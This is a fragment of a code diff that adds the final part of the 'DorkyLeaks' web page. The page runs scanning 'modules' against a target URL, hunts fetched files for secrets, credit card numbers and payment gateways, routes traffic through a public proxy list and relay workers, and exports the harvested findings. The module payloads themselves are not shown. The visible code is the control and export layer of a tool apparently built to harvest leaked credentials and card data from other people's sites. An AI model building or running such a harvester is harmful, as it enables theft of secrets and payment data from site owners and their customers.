+    else if (k === 'proxyListUrl') el.value = 'https://thordata.github.io/awesome-free-proxy-list/data/links/http.txt';
+    else el.value = '';
+  });
+  toast('reset to defaults');
+});
+$('btnLoadProxies').addEventListener('click', () => loadAndCheckProxies());
+
+/* Modules */
+let modulesBuilt = false;
+function buildModuleUI() {
+  if (modulesBuilt) return;
+  modulesBuilt = true;
+  const listEl = $('moduleList'); if (!listEl) return;
+  for (const m of MODULES) {
+    const card = document.createElement('div');
+    card.className = 'mod-card';
+    card.innerHTML = '<div class="mod-head"><span class="mod-name">' + esc(m.name) + '</span><span class="mod-status idle" id="modstatus-' + m.id + '">idle</span></div><div class="mod-desc">' + esc(m.desc) + '</div><button class="btn mod-run-btn" data-id="' + m.id + '">Run</button>';
+    listEl.appendChild(card);
+  }
+  listEl.querySelectorAll('.mod-run-btn').forEach(btn => btn.addEventListener('click', () => runModule(btn.dataset.id)));
+  const badge = $('moduleCountBadge');
+  if (badge) badge.textContent = MODULES.length + ' modules';
+}
+function buildModuleSummary() {
+  const summaryEl = $('moduleSummary'); if (!summaryEl) return;
+  const total = Object.values(modFindings).reduce((a, arr) => a + arr.length, 0);
+  let html = '<div class="stat-grid" style="margin-bottom:12px"><div class="stat"><div class="n">' + total + '</div><div class="l">findings</div></div><div class="stat"><div class="n">' + Object.keys(modFindings).filter(k => modFindings[k].length).length + '</div><div class="l">modules hit</div></div><div class="stat"><div class="n">' + MODULES.length + '</div><div class="l">modules total</div></div></div>';
+  for (const m of MODULES) {
+    const items = modFindings[m.id] || [];
+    if (!items.length) continue;
+    html += '<div class="group"><div class="gh"><h4>' + esc(m.name) + '</h4><span class="c">' + items.length + '</span></div><div class="list">';
+    for (const item of items.slice(0, 50)) {
+      const url = (typeof item === 'string' ? item : item.url || '') || '';
+      const issue = typeof item === 'object' ? (item.issue || item.technique || '') : '';
+      const param = typeof item === 'object' && item.param ? 'param: ' + item.param : '';
+      html += '<div class="card"><div class="fl">X</div><div class="mid"><div class="ad">' + esc(trunc(url, 90)) + '</div>' + (issue ? '<div class="sub">' + esc(issue) + '</div>' : '') + (param ? '<div class="sub">' + esc(param) + '</div>' : '') + '</div></div>';
+    }
+    if (items.length > 50) html += '<div class="card"><div class="mid"><div class="ad">...and ' + (items.length - 50) + ' more</div></div></div>';
+    html += '</div></div>';
+  }
+  if (!total) html += '<div class="empty"><div class="g">o</div>No module findings yet</div>';
+  summaryEl.innerHTML = html;
+}
+async function resolveTarget(t) {
+  let base = t.trim().replace(/\/+$/, '');
+  if (!base.startsWith('http://') && !base.startsWith('https://')) base = 'https://' + base;
+  const url = base.endsWith('/') ? base : base + '/';
+  try { await httpMod(url); return url; } catch {
+    if (url.startsWith('https://')) { const h = url.replace('https://', 'http://'); try { await httpMod(h); return h; } catch {} }
+  }
+  return null;
+}
+async function runAll() {
+  const raw = $('moduleTargetUrl').value.trim();
+  if (!raw) { toast('enter a target URL'); return; }
+  if (runningTask) { toast('busy'); return; }
+  buildModuleUI();
+  startTaskUI('btnRunAll', 'modules');
+  modFindings = {}; modCounts = {}; _testableModUrls = [];
+  MODULES.forEach(m => setModStatus(m.id, 'idle'));
+  tlog('moduleLog', '>', 'resolving target: ' + raw, 'hdr');
+  try {
+    const target = await resolveTarget(raw);
+    if (!target) { tlog('moduleLog', 'x', 'cannot reach target', 'bad'); return; }
+    tlog('moduleLog', '+', 'target resolved: ' + target, 'hit');
+    for (let i = 0; i < MODULES.length; i++) {
+      if (abortFlag) break;
+      updateModuleProgress((i / MODULES.length) * 100);
+      updateProgress((i / MODULES.length) * 100, 'module ' + (i + 1) + '/' + MODULES.length + ': ' + MODULES[i].name);
+      try { await MODULES[i].run(target); } catch (e) { if (e.name !== 'AbortError') { tlog('moduleLog', 'x', MODULES[i].id + ': ' + e.message, 'bad'); setModStatus(MODULES[i].id, 'error'); } }
+    }
+    updateModuleProgress(100);
+    updateProgress(100, 'all modules done');
+    buildModuleSummary();
+    const total = Object.values(modFindings).reduce((a, v) => a + v.length, 0);
+    tlog('moduleLog', '+', 'ALL MODULES DONE - ' + total + ' findings', 'hit');
+  } catch (e) {
+    if (e.name !== 'AbortError') tlog('moduleLog', 'x', 'fatal: ' + e.message, 'bad');
+  } finally { endTaskUI('btnRunAll', 'Run All Modules'); }
+}
+async function runModule(id) {
+  const raw = $('moduleTargetUrl').value.trim();
+  if (!raw) { toast('enter a target URL'); return; }
+  if (runningTask) { toast('busy'); return; }
+  buildModuleUI();
+  const mod = MODULES.find(m => m.id === id);
+  if (!mod) return;
+  startTaskUI('btnRunAll', mod.name);
+  tlog('moduleLog', '>', 'resolving target: ' + raw, 'hdr');
+  try {
+    const target = await resolveTarget(raw);
+    if (!target) { tlog('moduleLog', 'x', 'cannot reach target', 'bad'); return; }
+    await mod.run(target);
+    buildModuleSummary();
+  } catch (e) {
+    if (e.name !== 'AbortError') { tlog('moduleLog', 'x', id + ': ' + e.message, 'bad'); setModStatus(id, 'error'); }
+  } finally { endTaskUI('btnRunAll', 'Run All Modules'); }
+}
+$('btnRunAll').addEventListener('click', runAll);
+$('btnModuleStop').addEventListener('click', () => { abortFlag = true; setPaused(false); tlog('moduleLog', '#', 'STOP requested', 'warn'); });
+$('btnModuleClear').addEventListener('click', () => { $('moduleLog').innerHTML = ''; lineCounts.moduleLog = 0; $('moduleCnt').textContent = '0 lines'; $('moduleSummary').innerHTML = ''; modFindings = {}; modCounts = {}; MODULES.forEach(m => setModStatus(m.id, 'idle')); });
+
+/* Results */
+function renderResults() {
+  const f = state.findings;
+  const body = $('resultsBody');
+  if (!f.length) { body.innerHTML = '<div class="empty"><div class="g">o</div>No findings yet</div>'; return; }
+  const groups = {};
+  for (const x of f) (groups[x.type] = groups[x.type] || []).push(x);
+  const types = Object.keys(groups).sort((a, b) => groups[b].length - groups[a].length);
+  let html = '<div class="stat-grid"><div class="stat"><div class="n">' + f.length + '</div><div class="l">findings</div></div><div class="stat"><div class="n">' + types.length + '</div><div class="l">types</div></div><div class="stat"><div class="n">' + state.gateways.size + '</div><div class="l">gateways</div></div></div>';
+  for (const t of types) {
+    const vuln = isVuln(t), gw = t.startsWith('Gateway:'), nonce = t.startsWith('Nonce:');
+    html += '<div class="group"><div class="gh"><h4>' + esc(t) + '</h4><span class="c">' + groups[t].length + '</span></div><div class="list">';
+    for (const x of groups[t].slice(0, 200)) {
+      const disp = x.value.length > 90 ? x.value.slice(0, 45) + '...' + x.value.slice(-25) : x.value;
+      const cls = vuln ? 'tag vuln' : gw ? 'tag gw' : nonce ? 'tag warn' : (t === 'Credit Card' ? 'tag crit' : 'tag');
+      const icon = t === 'Credit Card' ? '$' : vuln ? 'X' : gw ? '#' : nonce ? 'n' : '*';
+      html += '<div class="card" data-v="' + esc(x.value) + '"><div class="fl">' + icon + '</div><div class="mid"><div class="ad">' + esc(disp) + '</div>' + (x.source ? '<div class="sub">' + esc(x.source) + '</div>' : '') + '</div><div class="rt"><span class="' + cls + '">' + esc(x.status) + '</span></div></div>';
+    }
+    if (groups[t].length > 200) html += '<div class="card"><div class="mid"><div class="ad">...and ' + (groups[t].length - 200) + ' more</div></div></div>';
+    html += '</div></div>';
+  }
+  body.innerHTML = html;
+  body.querySelectorAll('.card[data-v]').forEach(c => c.addEventListener('click', () => { try { navigator.clipboard.writeText(c.dataset.v); } catch {} toast('copied'); }));
+}
+$('exportJson').addEventListener('click', () => {
+  const payload = { findings: state.findings, downloads: state.downloads, gateways: [...state.gateways], generated: new Date().toISOString() };
+  const blob = new Blob([JSON.stringify(payload, null, 2)], { type: 'application/json' });
+  const a = document.createElement('a'); a.href = URL.createObjectURL(blob); a.download = 'DorkyLeaks_' + Date.now() + '.json'; a.click();
+  setTimeout(() => URL.revokeObjectURL(a.href), 1000);
+});
+$('exportTxt').addEventListener('click', () => {
+  let out = '=== DorkyLeaks REPORT ===\n' + new Date().toISOString() + '\n\n';
+  if (state.gateways.size) out += 'Gateways: ' + [...state.gateways].join(', ') + '\n\n';
+  const groups = {};
+  for (const x of state.findings) (groups[x.type] = groups[x.type] || []).push(x);
+  for (const t of Object.keys(groups).sort()) { out += '--- ' + t + ' (' + groups[t].length + ') ---\n'; for (const x of groups[t]) { out += '  ' + x.value + ' [' + x.status + ']\n'; if (x.source) out += '    source: ' + x.source + '\n'; } out += '\n'; }
+  const blob = new Blob([out], { type: 'text/plain' });
+  const a = document.createElement('a'); a.href = URL.createObjectURL(blob); a.download = 'DorkyLeaks_' + Date.now() + '.txt'; a.click();
+  setTimeout(() => URL.revokeObjectURL(a.href), 1000);
+});
+$('clearResults').addEventListener('click', () => { state.findings = []; state.seen.clear(); state.downloads = []; state.gateways.clear(); renderResults(); toast('cleared'); });
+
+/* Queue */
+$('queueSelectAll').addEventListener('click', () => { state.queue.forEach(x => { x.selected = true; }); renderQueueList(); });
+$('queueSelectNone').addEventListener('click', () => { state.queue.forEach(x => { x.selected = false; }); renderQueueList(); });
+$('queueSelectHot').addEventListener('click', () => { state.queue.forEach(x => { x.selected = scoreQueueItem(x).level === 'hot'; }); renderQueueList(); });
+$('queueDeleteSel').addEventListener('click', () => { const before = state.queue.length; state.queue = state.queue.filter(x => !x.selected); renderQueueList(); renderQueueBadge(); toast('deleted ' + (before - state.queue.length) + ' file(s)'); });
+$('queueExportZip').addEventListener('click', () => exportBundle());
+
+/* File viewer */
+$('fvClose').addEventListener('click', closeViewer);
+$('fvKeep').addEventListener('click', closeViewer);
+$('fvDelete').addEventListener('click', () => { if (fvCurrentId === null) return; state.queue = state.queue.filter(x => x.id !== fvCurrentId); renderQueueList(); renderQueueBadge(); closeViewer(); toast('file deleted'); });
+$('fvRescan').addEventListener('click', () => {
+  if (fvCurrentId === null) return;
+  const item = state.queue.find(x => x.id === fvCurrentId);
+  if (!item) return;
+  const findings = [];
+  try {
+    const secs = scanSecrets(String(item.content), item.url); for (const f of secs) findings.push(f.type);
+    const cards = scanCards(String(item.content), item.url); if (cards.length) findings.push('Credit Card x' + cards.length);
+    const gws = detectGateways(String(item.content)); for (const g of gws) findings.push(g.startsWith('\x00') ? g.split('\x00')[1] : 'Gateway: ' + g);
+  } catch {}
+  item.findings = [...new Set(findings)];
+  const secs2 = scanSecrets(String(item.content), item.url);
+  for (const f of secs2) addFinding(f.type, f.value, item.url, 'FORMAT_VALID');
+  renderQueueList(); renderQueueBadge();
+  viewFile(fvCurrentId);
+  toast('rescanned - ' + item.findings.length + ' hit(s)');
+});
+$('fvOverlay').addEventListener('click', e => { if (e.target === $('fvOverlay')) closeViewer(); });
+document.addEventListener('keydown', e => { if (e.key === 'Escape' && !$('fvOverlay').classList.contains('hidden')) closeViewer(); });
+
+/* Boot */
+loadPaths();
+loadSettings();
+renderFiles();
+renderResults();
+renderQueueList();
+buildModuleUI();
+tlog('crawlLog', '.', 'dorkyleaks+ ready - awaiting target', 'dim');
+tlog('dorkLog', '.', 'dorkyleaks+ ready - awaiting query', 'dim');
+setLive('on', 'connecting');
+(async () => {
+  const r = await startPool();
+  if (!r.ok) {
+    tlog('crawlLog', 'x', r.why, 'bad');
+    tlog('crawlLog', '!', 'append ?wisp=wss://yourserver/ to use your own relay', 'warn');
+    tlog('dorkLog', 'x', r.why, 'bad');
+  } else {
+    const alive = pool.filter(w => w.ok && !w.dead).length;
+    tlog('crawlLog', '+', 'READY - ' + alive + ' workers', 'hit');
+    tlog('dorkLog', '+', 'READY - ' + alive + ' workers', 'hit');
+  }
+})();
+</script>
+</body>
+</html>
